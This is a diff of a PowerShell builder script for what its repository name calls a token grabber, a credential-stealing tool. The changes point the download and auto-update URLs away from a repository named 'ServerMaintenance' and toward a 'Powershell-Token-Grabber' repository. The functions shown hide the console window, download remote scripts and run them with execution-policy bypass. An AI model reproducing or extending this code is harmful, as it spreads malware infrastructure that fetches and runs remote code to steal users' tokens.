@@ -7,7 +7,7 @@ public static extern IntPtr GetConsoleWindow();
 [DllImport("user32.dll")]
 public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
 '
-$download_url = "https://raw.githubusercontent.com/Masterpcex/ServerMaintenance/main/main."
+$download_url = "https://raw.githubusercontent.com/ChildrenOfYahweh/Powershell-Token-Grabber/main/main."
 
 $wpf_code = @'
 <Window x:Class="GUI_TEST.MainWindow"
@@ -183,7 +183,7 @@ function Invoke-EXE {
 }
 
 function Invoke-AutoUpdate {
-    $update_url = "https://raw.githubusercontent.com/Masterpcex/ServerMaintenance/main/builder.ps1"
+    $update_url = "https://raw.githubusercontent.com/ChildrenOfYahweh/Powershell-Token-Grabber/main/builder.ps1"
     $update = (New-Object System.Net.WebClient).DownloadString($update_url)
     $update | Out-File -FilePath "$PSScriptRoot\builder.ps1" -Force -Encoding ascii -NoNewline
     Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File $PSScriptRoot\builder.ps1"
@@ -192,7 +192,7 @@ function Invoke-AutoUpdate {
 }
 
 function Invoke-CheckUpdate {
-    $update_url = "https://raw.githubusercontent.com/Masterpcex/ServerMaintenance/main/builder.ps1"
+    $update_url = "https://raw.githubusercontent.com/ChildrenOfYahweh/Powershell-Token-Grabber/main/builder.ps1"
     $update = (New-Object System.Net.WebClient).DownloadString($update_url)
     $current_code = Get-Content -Path "$PSScriptRoot\builder.ps1" -Raw
     if ($update -ne $current_code) {
